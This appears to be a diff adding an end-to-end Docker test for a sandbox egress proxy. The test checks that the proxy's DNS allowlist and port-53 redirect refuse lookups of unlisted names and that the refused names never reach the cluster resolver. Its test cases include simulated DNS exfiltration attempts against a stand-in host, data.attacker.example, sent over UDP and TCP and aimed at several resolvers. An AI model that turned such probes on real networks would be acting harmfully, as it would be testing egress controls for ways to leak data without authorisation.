@@ -1,0 +1,201 @@
+# The allowlist resolver and the DNS redirect, end to end in Docker. This
+# extends the client matrix the transparent capture scenario drives: the
+# same two containers on one network, with no hosts entry for the upstream,
+# so every client here reaches it by name through the sidecar's resolver.
+#
+# The upstream container runs two fixtures. One answers HTTPS for
+# upstream.test. The other is the cluster resolver, which knows
+# upstream.test AND data.attacker.example and logs every question it is
+# asked. The cluster resolver would answer the second name, so its refusal
+# comes from the allowlist. The log proves the refused query did not reach
+# the cluster resolver.
+#
+# /etc/resolv.conf in the pod names the cluster resolver by address, which
+# is what a kubelet writes. The init container reads its resolvers from
+# there and records them in the receipt, and the sidecar forwards an
+# allowed name to them.
+#
+# Each exfiltration attempt below must fail.
+
+[!docker] skip 'the Docker daemon is not available'
+
+dockerlab
+linuxbin bin
+tlscert tls upstream.test
+
+# The proxy and the resolver write into a mounted directory, so the script
+# reads both from the host. A mounted emptyDir arrives writable by every
+# uid in the pod, and the proxy runs as 1337.
+mkdir out
+chmod 0777 out
+
+exec docker build -q -t $LAB_IMAGE --build-arg DEBIAN_IMAGE=$DEBIAN_IMAGE -f Dockerfile $WORK
+
+# The upstream answers HTTPS for upstream.test and, on the same address,
+# serves the cluster resolver. The resolver knows the exfiltration name, so
+# a refused query is refused by the allowlist rather than by the resolver.
+exec docker run -d --name $LAB-upstream --network $LAB --ip $LAB_UPSTREAM4 --ip6 $LAB_UPSTREAM6 -v $WORK/tls:/tls:ro -v $WORK/out:/out $LAB_IMAGE netfixture https :443 /tls/leaf.crt /tls/leaf.key
+exec docker exec -d $LAB-upstream netfixture dns :53 /out/resolver.log upstream.test=$LAB_UPSTREAM4 data.attacker.example=$LAB_UPSTREAM4 data.upstream.test=$LAB_UPSTREAM4
+
+# The pod. There is no hosts entry for upstream.test, so every client below
+# reaches it by name or not at all.
+exec docker run -d --name $LAB-workload --network $LAB --ip $LAB_WORKLOAD4 --ip6 $LAB_WORKLOAD6 --cap-add NET_ADMIN --cap-add SETPCAP --sysctl net.ipv4.ip_unprivileged_port_start=1024 -e HOME=/tmp -e CURL_CA_BUNDLE=/shared-ca/ca.crt -e REQUESTS_CA_BUNDLE=/shared-ca/ca.crt -e SSL_CERT_FILE=/shared-ca/ca.crt -v $WORK:/work:ro -v $WORK/out:/out $LAB_IMAGE sleep 600
+
+# The pod's resolver configuration names the cluster resolver by address,
+# which is what a kubelet writes. Every container in the pod reads it: the
+# init container to learn the resolvers, the sidecar to forward to them,
+# and the workload to send the queries the redirect catches.
+exec docker exec -u 0 $LAB-workload sh -c 'printf "nameserver %s\n" $0 >/etc/resolv.conf' $LAB_UPSTREAM4
+exec docker exec $LAB-workload cat /etc/resolv.conf
+stdout '^nameserver '
+
+# The init container redirects UDP and TCP port 53 to the sidecar's
+# resolver. It does not accept DNS to any resolver.
+exec docker exec $LAB-workload egress-netsetup --receipt /run/egress/netsetup.json --ipv6 off
+stdout '# resolvers from /etc/resolv.conf: '
+stdout '^-A EGRESS_PROXY_NAT_OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 53$'
+stdout '^-A EGRESS_PROXY_NAT_OUTPUT -p tcp --dport 53 -j REDIRECT --to-ports 53$'
+! stdout '--dport 53 -j ACCEPT'
+stdout '# ipv4 verified: '
+stdout '# receipt /run/egress/netsetup.json: sha256:'
+
+# Must fail: the sidecar's resolver and the redirect disagree, so no lookup
+# would arrive on the resolver. The two containers' arguments have to name
+# one port.
+! exec docker exec -u 1337 $LAB-workload egress-proxy --config /work/config.yaml --dns 127.0.0.1:5353 --upstream-ca-file /work/tls/ca.crt --ca-out-dir /tmp/ca
+stderr 'redirect DNS to port 53 and listen.dns binds port 5353'
+
+exec docker exec -d -u 1337 $LAB-workload sh -c '/usr/local/bin/egress-proxy --config /work/config.yaml --upstream-ca-file /work/tls/ca.crt --ca-out-dir /shared-ca >/out/audit.jsonl 2>/out/proxy.log'
+waitgrep out/proxy.log 'answering name lookups'
+
+# The resolver answers for the endpoint hosts alone, and it forwards to the
+# resolvers the receipt records. Nothing in the document names either list.
+grep '"msg":"name resolution in force".*"resolves":\["upstream.test"\]' out/proxy.log
+grep '"forward_to":\["'$LAB_UPSTREAM4':53"\]' out/proxy.log
+grep '"sockets":"udp 127.0.0.1:53,tcp 127.0.0.1:53' out/proxy.log
+
+# Every client reaches the upstream by name, with no hosts entry and no
+# proxy variable. The name resolves through the sidecar's resolver and the
+# connection is redirected into the sidecar's transparent frontend.
+exec docker exec -u 1000 $LAB-workload curl -sS https://upstream.test/allowed/curl
+stdout '^hello from upstream /allowed/curl$'
+
+exec docker exec -u 1000 $LAB-workload python3 /work/probes/get.py https://upstream.test/allowed/python
+stdout '^200 hello from upstream /allowed/python$'
+
+exec docker exec -u 1000 $LAB-workload netfixture get https://upstream.test/allowed/go
+stdout '^200 hello from upstream /allowed/go$'
+
+# Must fail: a name no endpoint declares. The cluster resolver knows it, so
+# the allowlist is what refuses it.
+exec docker exec -u 1000 $LAB-workload python3 /work/probes/resolve.py data.attacker.example
+stdout '^resolve FAILED$'
+
+exec docker exec -u 1000 $LAB-workload netfixture dig 127.0.0.1:53 data.attacker.example
+stdout '^NXDOMAIN $'
+
+# Must fail: the same name sent straight at the cluster resolver, around
+# the loopback listener. The nat redirect catches it and the sidecar's
+# resolver answers.
+exec docker exec -u 1000 $LAB-workload netfixture dig $LAB_UPSTREAM4:53 data.attacker.example
+stdout '^NXDOMAIN $'
+
+# Must fail: the same name at a resolver outside the pod entirely. There is
+# no accept for it and the redirect catches it first, so the query never
+# leaves.
+exec docker exec -u 1000 $LAB-workload netfixture dig 203.0.113.53:53 data.attacker.example
+stdout '^NXDOMAIN $'
+
+# Must fail: the same name over TCP, which is the fallback RFC 7766
+# section 5 describes. A resolver that filtered UDP alone would leave the
+# whole allowlist bypassable.
+exec docker exec -u 1000 $LAB-workload netfixture dig -tcp $LAB_UPSTREAM4:53 data.attacker.example
+stdout '^NXDOMAIN $'
+
+# Must fail: a subdomain of an endpoint host. The connection decision
+# matches a host exactly, so the resolver does too. The cluster resolver
+# knows this name as well.
+exec docker exec -u 1000 $LAB-workload netfixture dig $LAB_UPSTREAM4:53 data.upstream.test
+stdout '^NXDOMAIN $'
+
+# An endpoint host resolves over TCP too, and the answer is the address the
+# cluster resolver sent.
+exec docker exec -u 1000 $LAB-workload netfixture dig -tcp $LAB_UPSTREAM4:53 upstream.test
+stdout '^NOERROR '
+stdout $LAB_UPSTREAM4
+
+# A query the allowlist refused did not reach the cluster resolver. The
+# name did not leave the pod.
+grep 'query A upstream.test.' out/resolver.log
+! grep 'attacker' out/resolver.log
+! grep 'data.upstream.test' out/resolver.log
+
+# Every lookup has an audit record naming the question and the answer.
+audit out/audit.jsonl scope=dns destination.host=upstream.test destination.port=53 query.type=A query.protocol=udp query.class=IN query.rcode=NOERROR decision.verdict=allow decision.reason=endpoint_allowed
+audit out/audit.jsonl scope=dns destination.host=upstream.test query.protocol=tcp query.rcode=NOERROR decision.verdict=allow decision.reason=endpoint_allowed
+audit out/audit.jsonl scope=dns destination.host=data.attacker.example query.protocol=udp query.rcode=NXDOMAIN decision.verdict=deny decision.reason=no_matching_endpoint
+audit out/audit.jsonl scope=dns destination.host=data.attacker.example query.protocol=tcp query.rcode=NXDOMAIN decision.verdict=deny decision.reason=no_matching_endpoint
+audit out/audit.jsonl scope=dns destination.host=data.upstream.test query.rcode=NXDOMAIN decision.verdict=deny decision.reason=no_matching_endpoint
+audit out/audit.jsonl scope=request request.path=/allowed/curl decision.reason=endpoint_allowed outcome.status=200
+audit -all out/audit.jsonl sandbox_id=dns-allowlist
+
+# No name the allowlist refuses was ever allowed, over either transport.
+! audit out/audit.jsonl scope=dns destination.host=data.attacker.example decision.verdict=allow
+! audit out/audit.jsonl scope=dns destination.host=data.upstream.test decision.verdict=allow
+
+-- Dockerfile --
+ARG DEBIAN_IMAGE
+FROM ${DEBIAN_IMAGE}
+RUN apt-get -qq update \
+ && DEBIAN_FRONTEND=noninteractive apt-get -qq install --no-install-recommends -y \
+      iptables ca-certificates curl git python3 python3-requests nodejs libcap2-bin \
+ && rm -rf /var/lib/apt/lists/*
+COPY bin/ /usr/local/bin/
+# The proxy holds NET_BIND_SERVICE and no other capability, so it can bind
+# the redirect port and the resolver port, both below 1024, as an
+# unprivileged uid.
+RUN setcap cap_net_bind_service=+ep /usr/local/bin/egress-proxy \
+ && mkdir -p /shared-ca /run/egress-admin \
+ && chown 1337:1337 /shared-ca /run/egress-admin
+
+-- config.yaml --
+version: 1
+sandbox:
+  id: dns-allowlist
+listen:
+  connect: "127.0.0.1:3128"
+  transparent_port: 1015
+  # The loopback address the nat redirect sends UDP and TCP port 53 to.
+  dns: "127.0.0.1:53"
+  admin: "/run/egress-admin/admin.sock"
+netsetup:
+  receipt: "/run/egress/netsetup.json"
+# dns.forward_to is deliberately absent. The resolvers come from the
+# receipt, which is what the init container read out of /etc/resolv.conf.
+policy:
+  # The lab network is private address space, which the platform deny list
+  # covers. Each run draws its subnet from inside these two ranges.
+  deny_list_exceptions: ["192.168.0.0/16", "fd00:e9::/32"]
+endpoints:
+  - host: upstream.test
+    path_prefix: /allowed/
+
+-- probes/get.py --
+# One request with python-requests and no proxy configured.
+import sys
+
+import requests
+
+response = requests.get(sys.argv[1], timeout=30)
+print(response.status_code, response.text, end="")
+
+-- probes/resolve.py --
+# Resolve a name with the system resolver, which reads /etc/resolv.conf.
+# This is the path every client in the image takes.
+import socket
+import sys
+
+try:
+    print("resolve", socket.getaddrinfo(sys.argv[1], 443, socket.AF_INET)[0][4][0])
+except socket.gaierror:
+    print("resolve FAILED")
